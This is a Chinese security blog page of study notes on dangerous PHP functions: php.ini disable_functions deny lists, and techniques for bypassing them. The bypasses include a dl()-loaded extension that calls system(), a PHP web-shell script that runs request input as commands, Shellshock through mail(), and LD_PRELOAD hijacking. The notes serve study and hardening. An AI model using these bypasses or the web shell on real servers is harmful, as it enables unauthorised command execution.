@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang>
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="高危PHP函数"><link rel="alternate" href="/pwn4justice.github.io/atom.xml" title="J.A.R.V.I.S"><link rel="shortcut icon" type="image/x-icon" href="/pwn4justice.github.io/favicon.ico?v=2.11.0">
+<link rel="canonical" href="https://pwn4justice.github.io/2019/07/01/高危PHP函数/">
+
+<link rel="stylesheet" type="text/css" href="/pwn4justice.github.io/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/pwn4justice.github.io/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/pwn4justice.github.io/css/style.css?v=2.11.0">
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>高危PHP函数 - J.A.R.V.I.S</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/pwn4justice.github.io/." class="logo">J.A.R.V.I.S</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/pwn4justice.github.io/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/pwn4justice.github.io/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/pwn4justice.github.io/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/pwn4justice.github.io/." class="logo">J.A.R.V.I.S</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/pwn4justice.github.io/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/pwn4justice.github.io/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/pwn4justice.github.io/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">高危PHP函数
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-07-01
+        </span></div>
+    </header>
+
+    <div class="post-content"><p>笔记内容：PHP的危险函数，和 php.ini 里的 disable_functions 设置，以及整理了一些绕过 disable_functions 的思路。</p>
+<a id="more"></a>
+
+<p>[非原创] [记录待复现系列]</p>
+<p><strong>危险函数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">phpinfo() </span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">passthru() </span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 exec()。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">exec() </span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">system() </span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">chroot() </span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式 </span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">scandir() </span><br><span class="line">功能描述：列出指定路径中的文件和目录。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">chgrp() </span><br><span class="line">功能描述：改变文件或目录所属的用户组。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">chown() </span><br><span class="line">功能描述：改变文件或目录的所有者。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">shell_exec() </span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">proc_open() </span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">proc_get_status() </span><br><span class="line">功能描述：获取使用 proc_open() 所打开进程的信息。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">error_log() </span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。 </span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode， </span><br><span class="line">执行任意命令。 </span><br><span class="line">危险等级：低 </span><br><span class="line"></span><br><span class="line">ini_alter() </span><br><span class="line">功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。 </span><br><span class="line">具体参见 ini_set()。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">ini_set() </span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">ini_restore() </span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">dl() </span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">pfsockopen() </span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">syslog() </span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 syslog() 函数。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">readlink() </span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">symlink() </span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">popen() </span><br><span class="line">功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。 </span><br><span class="line">危险等级：高 </span><br><span class="line"></span><br><span class="line">stream_socket_server() </span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。 </span><br><span class="line">危险等级：中 </span><br><span class="line"></span><br><span class="line">putenv() </span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数 </span><br><span class="line">修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。 </span><br><span class="line">危险等级：高</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+<p><strong>禁用方法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/php.ini			IIS 在 c:\windows\php.ini</span><br><span class="line">查找到 disable_functions ，添加需禁用的函数名，如下： </span><br><span class="line">phpinfo,eval,passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br><span class="line"># 重启 HTTP 服务即可</span><br></pre></td></tr></table></figure>
+
+<p><strong>一些推荐的 disable_functions 设置</strong></p>
+<p>如果在使用过程中出现 php 不支持部分功能的现象，可以搜索下错误提示，去掉相应的函数即可。 支持的越多越不安全，对于采集程序来说需要去掉curl_exec。</p>
+<p>参考设置1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,chmod,gzinflate,set_time_limit</span><br></pre></td></tr></table></figure>
+
+<p>参考设置2：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions=phpinfo,exec,system,passthru,popen,pclose,shell_exec,proc_open,dl,curl_exec,multi_exec,chmod,gzinflate,set_time_limit</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><strong>如果突破 disable_functions 的思路：</strong></p>
+<p>[ 从 jb51 整理 ] : <code>https://www.jb51.net/article/139230.htm</code></p>
+<p>大部分的服务器都对PHP做了严格的限制，包括使用 open_basedir 限制可以操作的目录以及使用 disable_functions 限制程序使用一些可以直接执行系统命令的函数如 system，exec，passthru，shell_exec，proc_open 等等。但是如果服务器没有对dl()函数做限制，一样可以利用 dl() 函数饶过这些限制：</p>
+<p>dl() 函数允许在 php 脚本里动态加载 php 模块，默认是加载 extension_dir 目录里的扩展，该选项是 PHP_INI_SYSTEM 范围可修改的，只能在 php.ini 或者 apache 主配置文件里修改。当然，你也可以通过 <code>enable_dl</code> 选项来关闭动态加载功能，而这个选项默认为 On 的，事实上也很少人注意到这个。dl( ) 函数在设计时存在安全漏洞，可以用 ../ 这种目录遍历的方式指定加载任何一个目录里的 so 等扩展文件，extension_dir 限制可以被随意饶过。所以我们可以上传自己的 so 文件，并且用 dl 函数加载这个 so 文件然后利用 so 文件里的函数执行其他操作，包括系统命令。</p>
+<p>so 文件部分内容（下文的 C 代码，由于本人没有编写过 PHP 模块的原因，没咋看懂，慎用，特此记录留待日后查看）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">--------- part <span class="number">1</span> ----------</span><br><span class="line">    </span><br><span class="line">PHP_FUNCTION(dl) </span><br><span class="line">&#123; </span><br><span class="line">	pval **file; </span><br><span class="line">	<span class="meta">#<span class="meta-keyword">ifdef</span> ZTS </span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="built_in">strncmp</span>(sapi_module.name, <span class="string">"cgi"</span>, <span class="number">3</span>)!=<span class="number">0</span>) &amp;&amp; </span><br><span class="line">		(<span class="built_in">strcmp</span>(sapi_module.name, <span class="string">"cli"</span>)!=<span class="number">0</span>) &amp;&amp; </span><br><span class="line">		(<span class="built_in">strncmp</span>(sapi_module.name, <span class="string">"embed"</span>, <span class="number">5</span>)!=<span class="number">0</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Not supported in multithreaded Web servers - use extension statements in your php.ini"</span>); </span><br><span class="line">		RETURN_FALSE; </span><br><span class="line">	&#125; <span class="comment">//验证是否可以使用dl函数，在多线程web服务器里是禁止的 </span></span><br><span class="line">	<span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* obtain arguments */</span> </span><br><span class="line">	<span class="keyword">if</span> (ZEND_NUM_ARGS() != <span class="number">1</span> || zend_get_parameters_ex(<span class="number">1</span>, &amp;file) == FAILURE) &#123; </span><br><span class="line">		WRONG_PARAM_COUNT; </span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	convert_to_string_ex(file); <span class="comment">//取得参数 </span></span><br><span class="line">	<span class="keyword">if</span> (!PG(enable_dl)) &#123; </span><br><span class="line">		php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Dynamically loaded extentions aren't enabled"</span>);<span class="comment">//验证是否enable_dl，默认为on </span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (PG(safe_mode)) &#123; </span><br><span class="line">		php_error_docref(<span class="literal">NULL</span> TSRMLS_CC, E_WARNING, <span class="string">"Dynamically loaded extensions aren't allowed when running in Safe Mode"</span>);<span class="comment">//验证是否safe_mode打开 </span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">		php_dl(*file, MODULE_TEMPORARY, return_value TSRMLS_CC); <span class="comment">//开始调用加载 </span></span><br><span class="line">		EG(full_tables_cleanup) = <span class="number">1</span>; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------- part <span class="number">2</span> ----------</span><br><span class="line">处理模块的加载 :</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">php_dl</span><span class="params">(pval *file, <span class="keyword">int</span> type, pval *return_value TSRMLS_DC)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">	<span class="keyword">void</span> *handle; </span><br><span class="line">	<span class="keyword">char</span> *libpath; </span><br><span class="line">	zend_module_entry *module_entry, *tmp; </span><br><span class="line">	zend_module_entry *(*get_module)(<span class="keyword">void</span>); </span><br><span class="line">	<span class="keyword">int</span> error_type; </span><br><span class="line">	<span class="keyword">char</span> *extension_dir; <span class="comment">//定义一些变量 </span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (type==MODULE_PERSISTENT) &#123; </span><br><span class="line">		<span class="comment">/* Use the configuration hash directly, the INI mechanism is not yet initialized */</span> </span><br><span class="line">		<span class="keyword">if</span> (cfg_get_string(<span class="string">"extension_dir"</span>, &amp;extension_dir)==FAILURE) &#123; </span><br><span class="line">			extension_dir = PHP_EXTENSION_DIR; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">		extension_dir = PG(extension_dir); </span><br><span class="line">	&#125; <span class="comment">//取得php.ini里的设置也就是extension_dir的目录 </span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (type==MODULE_TEMPORARY) &#123; </span><br><span class="line">		error_type = E_WARNING; </span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">		error_type = E_CORE_WARNING; </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (extension_dir &amp;&amp; extension_dir[<span class="number">0</span>])&#123; </span><br><span class="line">		<span class="keyword">int</span> extension_dir_len = <span class="built_in">strlen</span>(extension_dir); </span><br><span class="line">		libpath = emalloc(extension_dir_len+Z_STRLEN_P(file)+<span class="number">2</span>); </span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (IS_SLASH(extension_dir[extension_dir_len<span class="number">-1</span>])) &#123; </span><br><span class="line">			<span class="built_in">sprintf</span>(libpath, <span class="string">"%s%s"</span>, extension_dir, Z_STRVAL_P(file)); <span class="comment">/* SAFE */</span> </span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">			<span class="built_in">sprintf</span>(libpath, <span class="string">"%s%c%s"</span>, extension_dir, DEFAULT_SLASH, Z_STRVAL_P(file)); <span class="comment">/* SAFE */</span> </span><br><span class="line">		&#125; <span class="comment">//构造最终的so文件的位置，只是简单的附加，并没有对传入的参数做任何检查，包括open_basedir等 </span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">		libpath = estrndup(Z_STRVAL_P(file), Z_STRLEN_P(file)); </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* load dynamic symbol */</span> </span><br><span class="line">	handle = DL_LOAD(libpath); <span class="comment">//开始真正的调用了 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--------- part <span class="number">3</span> ----------</span><br><span class="line">编写导出函数 loveshell</span><br><span class="line">PHP_FUNCTION(loveshell) </span><br><span class="line">&#123; </span><br><span class="line">	<span class="keyword">char</span> *command; </span><br><span class="line">	<span class="keyword">int</span> command_len; </span><br><span class="line">	<span class="keyword">if</span> (ZEND_NUM_ARGS() != <span class="number">1</span> || \</span><br><span class="line">        zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC,<span class="string">"s"</span>, \</span><br><span class="line">                              &amp;command, &amp;command_len) == FAILURE) &#123; </span><br><span class="line">		WRONG_PARAM_COUNT; </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	system(command); </span><br><span class="line">	zend_printf(<span class="string">"I recieve %s"</span>,command); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>测试代码 ( PHP )：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	dl(<span class="string">'../../../../../../../../../www/users/www.cnbct.org/loveshell.so'</span>); </span><br><span class="line">	$cmd=$_REQUEST[c].<span class="string">" 2&gt;&amp;1&gt;tmp.txt"</span>; </span><br><span class="line">	loveshell($cmd); </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; </span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">'tmp.txt'</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于 php4 和 php5 的结构不一样，所以如果想要能顺利调用扩展，那么在 php4 环境下就要将上面的代码放到 php4 环境下编译，php5 的就要在 php5 环境下编译。我们将编写好的扩展上传到服务器，就可以利用上面的代码执行命令了。</p>
+<br>
+
+<p><strong>Bypass disable_functions 执行系统命令总结二</strong></p>
+<p><strong>一、为什么要bypass disable functions</strong></p>
+<p>为了安全起见，很多运维人员会禁用PHP的一些“危险”函数，例如eval、exec、system等，将其写在php.ini配置文件中，就是我们所说的disable functions了，特别是虚拟主机运营商，为了彻底隔离同服务器的客户，以及避免出现大面积的安全问题，在disable functions的设置中也通常较为严格。</p>
+<p>攻与防是对立的，也是互相补充的，既然有对函数的禁用措施，就会有人想方设法的去突破这层限制，我们只有在掌握突破方式以及原理的基础之上，才能更好的去防范这类攻击。</p>
+<p>执行系统命令通常是攻击者拿到网站webshell之后想要进一步动作的必然操作，如若不能执行系统命令，接下来的更深入的攻击将很难继续，所以就有了网站管理者禁用类似exec、system之类函数的现象。然而随着技术的不断进步，不断有新的思路出现，单纯的禁用这些函数，某些情况下已经不能阻止攻击者达到执行系统命令的目的了，那么攻击者用什么样的方式突破了disable functions呢？我们又怎样防范这样的攻击呢？</p>
+<p><strong>二、 Bash漏洞导致的任意命令执行</strong></p>
+<p>GNU Bash 环境变量远程命令执行漏洞（CVE-2014-6271）是GNU Bash 的一个远程代码执行漏洞，在这个CVE的介绍中，可以看到这样的描述：“GNU Bash 4.3及之前版本中存在安全漏洞，该漏洞源于程序没有正确处理环境变量值内的函数定义。远程攻击者可借助特制的环境变量利用该漏洞执行任意代码。以下产品和模块可能会被利用：OpenSSH sshd中的ForceCommand功能，Apache HTTP Server中的mod_cgi和mod_cgid模块，DHCP客户端等”。实际上，PHP也可以利用这个漏洞做很多事情，甚至有可能直接在80导致远程命令执行。关于这个漏洞的详细情况可以查阅CVE-2014-6271的相关资料，此处不再赘述。</p>
+<p>下面我们来看一下PHP到底什么地方能用到bash的这个漏洞呢？其实可以用的地方不止一处，这里我们以mail函数作为例子，其他地方同理，可以自行分析。</p>
+<p>PHP的mail函数提供了3个必选参数和2个可选参数，这里我们主要看最后一个参数，PHP官方手册上对最后一个参数的说明：</p>
+<blockquote>
+<p>“Theadditional_parameters parameter can be used to pass an additional parameter tothe program configured to use when sending mail using the sendmail_pathconfiguration setting. For example, this can be used to set the envelope senderaddress when using sendmail with the -f sendmail option.<br>Theuser that the webserver runs as should be added as a trusted user to thesendmail configuration to prevent a ‘X-Warning’ header from being added to themessage when the envelope sender (-f) is set using this method. For sendmailusers, this file is /etc/mail/trusted-users. “</p>
+</blockquote>
+<p>简单的说就是这个参数可以通过添加附加的命令作为发送邮件时候的配置，比如使用-f参数可以设置邮件发件人等，官方文档在范例Example #3也有所演示，具体可以参考官方文档：<code>http://php.net/manual/zh/function.mail.php</code>。</p>
+<p>在 mail 函数的源代码mail.c中，我们可以找到如下代码片段：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (extra_cmd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">       spprintf(&amp;sendmail_cmd, <span class="number">0</span>,<span class="string">"%s %s"</span>, sendmail_path, extra_cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       sendmail_cmd = sendmail_path;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果传递了第五个参数（extra_cmd），则用spprintf将sendmail_path和extra_cmd拼接到sendmail_cmd中（其中sendmail_path就是php.ini中的sendmail_path配置项），随后将sendmail_cmd丢给popen执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">    sendmail = popen_ex(sendmail_cmd,<span class="string">"wb"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> TSRMLS_CC);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">/* Since popen() doesn't indicate if theinternal fork() doesn't work</span></span><br><span class="line"><span class="comment">    *(e.g. the shell can't be executed) we explicitly set it to 0 to be</span></span><br><span class="line"><span class="comment">    *sure we don't catch any older errno value. */</span></span><br><span class="line">    errno = <span class="number">0</span>;</span><br><span class="line">    sendmail = popen(sendmail_cmd,<span class="string">"w"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>如果系统默认sh是bash，popen会派生bash进程，而我们刚才提到的CVE-2014-6271漏洞，直接就导致我们可以利用mail()函数执行任意命令，绕过disable_functions的限制。但是这里其实有一个问题，就是extra_cmd在spprintf之前做了安全检查，我当前的PHP版本是最新的7.2.4，代码位置在mail.c的第371-375行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (force_extra_parameters) &#123;</span><br><span class="line">       extra_cmd =php_escape_shell_cmd(force_extra_parameters);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (extra_cmd) &#123;</span><br><span class="line">       extra_cmd =php_escape_shell_cmd(ZSTR_VAL(extra_cmd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>php_escape_shell_cmd函数会对特殊字符（包括&amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A and \xFF. ‘ 等）进行转义，那这样是不是就没办法了呢？不是的，我们可以通过putenv函数来设置一个包含自定义函数的环境变量，然后通过mail函数来触发，网上早已有POC。</p>
+<p>同样调用popen派生进程的php函数还有imap_mail，或者还可能有其他的我们没有发现的函数，所以如果要防范这类攻击，最好的办法就是从根源上入手，修复CVE-2014-6271这个bash漏洞。</p>
+<p><strong>三、LD_PRELOAD：无需bash漏洞</strong></p>
+<p>上文说到mail函数利用bash破壳漏洞可以实现突破disable functions的限制执行系统命令，但是像这样的漏洞，一般安全意识稍好一点的运维人员，都会打上补丁了，那么是不是打上补丁之后就一定安全了呢？显然答案是否定的，LD_PRELOAD是Linux系统的下一个有趣的环境变量：</p>
+<p>“ 它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。”</p>
+<p>它允许你定义在程序运行前优先加载的动态链接库，我们只要知道这一件事就足够了，这说明什么？这说明我们几乎可以劫持PHP的大部分函数，还拿上文的mail函数作为例子，上文说过，php的mail函数实际上是调用了系统的sendmail命令，那么我们来看一下sendmail都调用了哪些库函数：</p>
+<p>—— 此处 略去一张图 —— [ 因为我的系统中是没有 sendmail 命令的… ] ，日后如想要测试该功能，可使用 <code>readelf -Ws /usr/sbin/sendmail</code> 来查看缺失的图的内容。</p>
+<p>发现sendmail函数在运行过程动态调用了很多标准库函数，我们从中随便选取一个库函数geteuid进行测试。首先我们编写一个自己的动态链接程序，hack.c：</p>
